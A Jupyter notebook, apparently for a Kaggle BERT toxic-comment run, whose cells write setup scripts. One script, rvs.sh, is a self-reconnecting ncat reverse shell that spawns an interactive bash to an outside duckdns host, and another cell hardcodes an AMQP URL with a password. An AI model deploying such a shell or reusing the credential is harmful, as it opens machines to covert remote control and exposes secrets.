{
    "cells": [{
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "%load_ext autoreload\n%autoreload 2",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "import subprocess\n\nsubprocess.run('[ -f setup.py ] || (git clone https://github.com/pennz/kaggle_runner; '\n'git submodule update --init --recursive; '\n'rsync -r kaggle_runner/.* .; '\n'rsync -r kaggle_runner/* .;); '\n'python3 -m pip install -e .', shell=True, check=True)",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "with open(\"runner.sh\", \"w\") as f:\n    f.write(\nr\"\"\"#!/bin/bash -x\nexport PS4='Line ${LINENO}: ' # for debug\nNC=ncat\n\nUSER=$1\nshift\nREPO=$1\nshift\nBRANCH=$1\nshift\nPHASE=$1\nshift\nENABLE_RVS=$1\nshift\n\nSERVER=$1\nshift\nPORT=$1\nshift\n\nORIG_PORT=23454\n\nCHECK_PORT=$((ORIG_PORT + 1))\npip install --upgrade pip\nconda install -y -c eumetsat expect & # https://askubuntu.com/questions/1047900/unbuffer-stopped-working-months-ago\napt update && apt install -y netcat nmap screen time locales >/dev/null 2>&1\napt install -y mosh iproute2 fish tig ctags htop tree pv tmux psmisc >/dev/null 2>&1 &\n\nconda init bash\ncat >> ~/.bashrc << EOF\nconda activate base # as my dotfiles will fiddle with conda\nexport SERVER=$SERVER\nexport CHECK_PORT=$CHECK_PORT\nEOF\n\nsource rpt # rvs IDE env setup\nexport SERVER=$SERVER\nexport CHECK_PORT=$CHECK_PORT\n\nwait_ncat() {\n    wait_for_ncat=$1\n\n    while [ $wait_for_ncat -gt 0 ]; do\n        wait_for_ncat=$((wait_for_ncat - 1))\n        which ncat >/dev/null && return 0\n    done\n}\nwait_ncat 60\n\nwhich $NC >/dev/null || NC=nc\nexport NC\n\nif [ \"x${ENABLE_RVS}\" = x1 ]; then\n    if [ -z $(pgrep -f 'jupyter-notebook') ]; then\n        bash ./rvs.sh $SERVER $PORT 2>&1 &\n    else\n        screen -d -m bash -c \"{ echo [REMOTE]: rvs log below.; bash -x ./rvs.sh $SERVER $PORT 2>&1; } | $NC --send-only --no-shutdown -w 120s -i $((3600 * 2))s $SERVER $CHECK_PORT\"\n    fi\nfi &\n\npip install ripdb pydicom parse pytest-logger python_logging_rabbitmq coverage &\n# python3 -m pip install pyvim neovim msgpack==1.0.0 &\n# python -m pip install pyvim neovim msgpack==1.0.0 & # for vim\n\nSRC_WORK_FOLDER=/kaggle/working\n[ -d ${SRC_WORK_FOLDER} ] || mkdir -p ${SRC_WORK_FOLDER}\n\ncd ${SRC_WORK_FOLDER}\n\nif [ -d ${REPO} ]; then rm -rf ${REPO}; fi\n\n# get code\n{\n    mvdir() {\n        [[ \"$2\"/\"$1\" -ef \"${PWD}\" ]] || {\n            rm -rf \"$2\"/\"$1\" &&\n                mkdir \"$2\"/\"$1\"\n        }\n\n        bash -c \"mv \"\"$1\"\"/*\"\" $2\"\"/\"\"$1\"\n    }\n    export -f mvdir\n\n    if [ ! -d ${REPO} ]; then\n        git clone --single-branch --branch ${BRANCH} --depth=1 \\\n            https://github.com/${USER}/${REPO}.git ${REPO} && pushd ${REPO} &&\n        sed -i 's/git@\\(.*\\):\\(.*\\)/https:\\/\\/\\1\\/\\2/' .gitmodules &&\n        sed -i 's/git@\\(.*\\):\\(.*\\)/https:\\/\\/\\1\\/\\2/' .git/config &&\n        git submodule update --init --recursive\n        find . -maxdepth 1 -name \".??*\" -o -name \"??*\" -type f | xargs -I{} mv {} $OLDPWD\n        find . -maxdepth 1 -name \".??*\" -o -name \"??*\" -type d | xargs -I{} bash -x -c \"mvdir {}  $OLDPWD\"\n        popd\n    fi\n    pip install -e . &\n    make install_dep >/dev/null\n}\n\nUSE_AMQP=true\nexport USE_AMQP\n\nconda init bash\nsource ~/.bashrc\nconda activate base\n\nif [ x\"${PHASE}\" = x\"dev\" ]; then\n    export PS4='[Remote]: Line ${LINENO}: '\n    (\n        echo \"MOSHing\"\n        make mosh\n    ) &\n\n    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi &\n    wait # not exit, when dev\nfi\n\nif [ x\"${PHASE}\" = x\"data\" ]; then\n    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase\n    make dataset\nfi\n\nif [ x\"${PHASE}\" = x\"test\" ]; then\n    bash ./rvs.sh $SERVER $PORT >/dev/null & # just keep one rvs incase\n    make test\nfi\n\nif [ x\"${PHASE}\" = x\"run\" ]; then\n    #pip install kaggle_runner\n    bash ./rvs.sh $SERVER $PORT >/dev/null & make m & # just keep one rvs incase\n    make toxic | if [ $USE_AMQP -eq true ]; then cat -; else $NC --send-only -w 120s -i $((60 * 5))s $SERVER $CHECK_PORT; fi\n    # basically the reverse of the calling path\n    pkill make & pkill -f \"mosh\" & pkill sleep & pkill -f \"rvs.sh\" & pkill ncat &\n    # python main.py \"$@\"\nfi\n\"\"\"\n    )\nwith open(\"rvs.sh\", \"w\") as f:\n    f.write(\nr\"\"\"#!/bin/bash -x\nexport PS4='Line ${LINENO}: ' # for debug\n\nNC=${NC:-ncat}\ntype $NC || ( echo >&2 \"$NC cannot be found. Exit.\"; exit 1;)\n# https://stackoverflow.com/questions/57877451/retrieving-output-and-exit-code-of-a-coprocess\n# coproc { sleep 30 && echo \"Output\" && exit 3; }\n# Saving the coprocess's PID for later, as COPROC_PID apparently unsets when its finished\n# COPROC_PID_backup=$COPROC_PID\n#\n# Retrieving the coprocess's output\n# output=$(cat <&$COPROC)\n#\n# Retrieving the coprocess's exit code\n# wait $COPROC_PID_backup\n#\n# Echoing out the results\n# echo $?\n# echo $output\n\necho BASH NOW: $BASHPID\n\nPID_FILE_PATH=/tmp/nc.pid\nEXIT_FILE_PATH=/tmp/rvs_exit.$BASHPID.pid\n\ntest -f $EXIT_FILE_PATH && rm $EXIT_FILE_PATH\n\nSERVER=$1\nshift\nPORT=$1\nshift\n\nORIG_PORT=23454\nCHECK_PORT=$((ORIG_PORT + 1))\n\ncheck_exit_status() {\n  [ -f /tmp/rvs_return ] && return 0\n\n  if [ -f $EXIT_FILE_PATH ] && [ x\"$(cat $EXIT_FILE_PATH)\" = x0 ]; then\n    return 0\n  fi\n\n  return 1 # not ok\n}\n\n\nconnect_setup() {\n  connect_again_flag=1\n\n  sleep_time=5\n\n  while [ ${connect_again_flag} -eq 1 ]; do\n    check_exit_status && return 0\n\n    $NC -w ${1}s -i 1800s $SERVER $PORT -c \"echo $(date) started connection; echo $HOSTNAME; python -c 'import pty; pty.spawn([\\\"/bin/bash\\\", \\\"-li\\\"])'\"\n\n    RSRET=$?\n    echo $RSRET > $EXIT_FILE_PATH\n    (/bin/ss -lpants | grep \"ESTAB.*$PORT\") || >&2 echo \"\\\"$NC -w ${1}s -i 1800s $SERVER $PORT\\\" return with code $RSRET\"\n\n    if [ x\"$RSRET\" = x\"0\" ]; then\n      [ -f /tmp/rvs_exit ] && return 0\n\n      return 255 # just do not return\n    fi\n    [ $RSRET -eq 0 ] && connect_again_flag=0\n    [ $RSRET -eq 1 ] && sleep ${sleep_time} && sleep_time=$((sleep_time + sleep_time))\n  done\n  # exit, will cause rvs script exit, beside, RSRET not 0, mean connection loss\n  # thing\n  RSRET=1  # just never exit\n  echo $RSRET > $EXIT_FILE_PATH && return $RSRET\n}\n\nconnect_again() {\n  # pkill -f \"nc.*$PORT\"  # no need now, our listen server can accept multiple\n  # connection now\n  connect_setup $1\n}\n\nWAIT_LIMIT=2048\nINIT_WAIT=8\nport_connect_status=0\nwait_time=$INIT_WAIT\n\nfloatToInt() {\n  parsed=$(printf \"%.0f\" \"$@\")\n  [ ! $? -eq 0 ] && parsed=0\n  echo $parsed\n} 2> /dev/null\n\nwhile true; do\n  check_exit_status && exit 0\n  # if find that server cannot be connected, we try to restart our reverse connect again\n  nc_time=$($(which time) -f \"%e\" $NC -zw $wait_time $SERVER $CHECK_PORT 2>&1 > /dev/null)\n  nc_ret=$?\n  nc_time=$(echo $nc_time | awk '{print $NF}')\n  nc_time=$(floatToInt $nc_time)\n\n  if [ ${nc_ret} -eq 0 ]; then\n    # recover connection, need to connect_again too. For 1st time, will try to connect\n    # no connection last time, have connction now\n\n    if [ $port_connect_status -eq 0 ]; then\n      echo \"recover connection, reset wait_time and try to reconnect\"\n      wait_time=$INIT_WAIT\n      # previous connection is lost, we wait for longer to setup connection\n      check_exit_status || wait_time=15\n      connect_again $wait_time &\n    else\n      wait_time=$((wait_time + wait_time)) # double wait, network fine\n\n      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi\n    fi\n    port_connect_status=1\n  else\n    if [ $port_connect_status -eq 1 ]; then\n      echo \"found connection loss, reset wait_time and try to reconnect\"\n      wait_time=$INIT_WAIT\n      check_exit_status || wait_time=15 # previous connection is lost\n      connect_again $wait_time &\n    else # no connection all the time? we still try to connect...\n      wait_time=$((wait_time + wait_time))\n\n      if [ $wait_time -gt ${WAIT_LIMIT} ]; then wait_time=${WAIT_LIMIT}; fi\n      connect_again $wait_time &\n    fi\n    port_connect_status=0\n  fi\n  sleep $((wait_time - nc_time)) # check every XX seconds\n  echo $hostname $HOSTNAME\ndone\nwait  # wait for any background\n\n# https://medium.com/@6c2e6e2e/spawning-interactive-reverse-shells-with-tty-a7e50c44940e\n# In reverse shell\n# $ python -c 'import pty; pty.spawn(\"/bin/bash\")'\n# Ctrl-Z\n#\n# In Attacker console\n# $ stty raw -echo\n# $ fg\n#\n# In reverse shell\n# $ reset\n# $ export SHELL=bash\n# $ export TERM=xterm-256color\n# $ stty rows <num> columns <cols>\n\"\"\"\n    )\nwith open(\"rpt\", \"w\") as f:\n    f.write(\nr\"\"\"#!/bin/bash\n[ -d ~/.fzf ] || {\ngit clone --depth=1 https://github.com/pennz/dotfiles\nrsync -r dotfiles/.* ~\nrsync -r dotfiles/* ~\npushd ~\ngit submodule update --init\n.fzf/install --all\ncurl -fLo ~/.config/nvim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n# vim -u ~/.vimrc_back \"+call plug#begin()\" +PlugInstall +qa &\n# ( sleep 60; nvim -Vnvim_log -u ~/.vimrc_back \"+call plug#begin()\" +PlugInstall +checkhealth +qa )&\nln -s .shrc_customised.macos .shrc_customised\necho \"alias gdrive='gdrive  --service-account a.json'\" >> ~/.bash_aliases\necho \"unalias vim\" >> ~/.bash_aliases\necho \"alias vim='nvim -u ~/.vimrc_back'\" >> ~/.bash_aliases\npopd\n\ncat >> ~/.profile << EOF\nexport SHELL=/bin/bash\nexport TERM=screen-256color\nstty intr ^\\c susp ^\\x eof ^\\f echo opost\n# https://unix.stackexchange.com/questions/343088/what-is-the-equivalent-of-stty-echo-for-zsh\n# unsetopt ZLE # for zsh\n# for ourside stty raw isig -echo icrnl time 3 echoprt opost eof ^\\p\n\ncolor_my_prompt () {\n    local __user_and_host=\"\\[\\033[01;32m\\]\\u@\\h\"\n    local __cur_location=\"\\[\\033[01;34m\\]\\w\"\n    local __git_branch_color=\"\\[\\033[31m\\]\"\n    # local __git_branch=\"\\`ruby -e \\\"print (%x{git branch 2> /dev/null}.grep(/^\\*/).first || '').gsub(/^\\* (.+)$/, '(\\1) ')\\\"\\`\"\n    local __git_branch='`git branch 2> /dev/null | grep -e ^* | ${SED:-sed} -E  s/^\\\\\\\\\\*\\ \\(.+\\)$/\\(\\\\\\\\\\1\\)\\ /`'\n    local __prompt_tail=\"\\[\\033[35m\\]$\"\n    local __last_color=\"\\[\\033[00m\\]\"\n    export PS1=\"$__user_and_host $__cur_location $__git_branch_color$__git_branch$__prompt_tail$__last_color \"\n}\n\nENV=/root/.bashrc\nPYTHONWARNINGS=ignore:::pip._internal.cli.base_command\nMPLBACKEND=module://ipykernel.pylab.backend_inline\n\nPS4=\"$HOSTNAME: \"'${LINENO}: '\n_=/usr/bin/env\nPWD=/kaggle/working\ncd $PWD\nOLDPWD=/root\n\n# color_my_prompt\nlocale-gen\necho \"#\" $(grep 'cpu ' /proc/stat >/dev/null;sleep 0.1;grep 'cpu ' /proc/stat | awk -v RS=\"\" '{print \"CPU: \"($13-$2+$15-$4)*100/($13-$2+$15-$4+$16-$5)\"%\"}') \"Mem: \"$(awk '/MemTotal/{t=$2}/MemAvailable/{a=$2}END{print 100-100*a/t\"%\"}' /proc/meminfo) \"Uptime: \"$(uptime | awk '{print $1 \" \" $2 \" \" $3}')\necho \"#\" TPU_NAME=$TPU_NAME\nnvidia-smi\nconda activate base\nEOF\n}\n\"\"\"\n    )\nwith open(\"gdrive_setup\", \"w\") as f:\n    f.write(\nr\"\"\"#!/bin/bash\nwget https://github.com/gdrive-org/gdrive/releases/download/2.1.0/gdrive-linux-x64\nchmod +x gdrive-linux-x64\ncp gdrive-linux-x64 /bin/gdrive\n\nmkdir ~/.gdrive\n\n# auth file\ncat > ~/.gdrive/a.json << EOF\nNO_PASS\n\nEOF\n\ngdrive --service-account a.json list  # just test\n\nSRC_WORK_FOLDER=/kaggle/input\n[ -d ${SRC_WORK_FOLDER} ] || {\n    mkdir -p ${SRC_WORK_FOLDER}\n    cd ${SRC_WORK_FOLDER}\n    gdrive --service-account a.json download -r 1CHDWIN0M6PD4SQyplbWefBCzNzdPVd-m\n    tar xf siim-train-test.tar.gz -C /kaggle/input\n}\n# cat > tgz_files.sh << EOF\n# #!/bin/bash\n# tgzfile () {\n#   tar cf - $1 -P | pv -s $(du -sb $1 | awk '{print $1}') | gzip > /home/$1.tar.gz\n# }\n# cd /kaggle/input\n# find . -maxdepth 1 -type d -name \"??*\" | while read -r line; do\n#     echo $line\n#     tgzfile $line\n# done\n# EOF\n\"\"\"\n    )",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "import os\nserver = \"vtool.duckdns.org\"\nos.environ['SERVER'] = server\n\nentry_str = r\"\"\"#!/bin/bash\nPS4='Line ${LINENO}: ' bash -x runner.sh pennz kaggle_runner master \"test\" 1 \"\"\"+ server +\"\"\" \"9017\" \"amqp://kaggle:9b83ca70cf4cda89524d2283a4d675f6@pengyuzhou.com/\" \"384\" \"19999\" \"intercept\" | tee runner_log\n\"\"\"\nif False:\n    entry_str += r\"\"\"PS4='Line ${LINENO}: ' bash -x gdrive_setup >>loggdrive &\"\"\"\n\nwith open(\"entry.sh\", \"w\") as f:\n    f.write(entry_str)",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "import os\nimport sys\nsys.path.append(os.getcwd())\n\nimport selectors\nimport subprocess\nfrom importlib import reload, import_module\nimport_module('kaggle_runner')\nfrom kaggle_runner import logger\nlogger.debug(\"Logger loaded. Will run entry.sh.\")",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "p = subprocess.Popen(\n'bash -x entry.sh',\nstdout=subprocess.PIPE, stderr=subprocess.PIPE,\nshell=True)\n\nsel = selectors.DefaultSelector()\nsel.register(p.stdout, selectors.EVENT_READ)\nsel.register(p.stderr, selectors.EVENT_READ)\n\nwhile True:\n   for key, _ in sel.select():\n       data = key.fileobj.read1(1024).decode()\n       if not data:\n           exit()\n       data = data.strip()\n       if data == \"\":\n           continue\n       if key.fileobj is p.stdout:\n           logger.debug(data)\n           print(data, end=\"\")\n       else:\n           logger.error(data)\n           print(data, end=\"\", file=sys.stderr)",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {},
        "cell_type": "markdown",
        "source": "URL:\nhttps://stackoverflow.com/questions/31833897/python-read-from-subprocess-stdout-and-stderr-separately-while-pr\neserving-order\nTitle: Python read from subprocess stdout and stderr separately while preserving order - Stack Overflow",
        "execution_count": null
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "from kaggle_runner.kernels.bert_torch import for_pytorch;from kaggle_runner.datasets.bert import pack_data; ",
        "execution_count": null,
        "outputs": []
    }, {
        "metadata": {
            "trusted": true
        },
        "cell_type": "code",
        "source": "for_pytorch(pack_data());",
        "execution_count": null,
        "outputs": []
    }],
    "metadata": {
        "kernelspec": {
            "language": "python",
            "display_name": "Python 3",
            "name": "python3"
        },
        "language_info": {
            "pygments_lexer": "ipython3",
            "nbconvert_exporter": "python",
            "version": "3.6.4",
            "file_extension": ".py",
            "codemirror_mode": {
                "name": "ipython",
                "version": 3
            },
            "name": "python",
            "mimetype": "text/x-python"
        }
    },
    "nbformat": 4,
    "nbformat_minor": 4
}
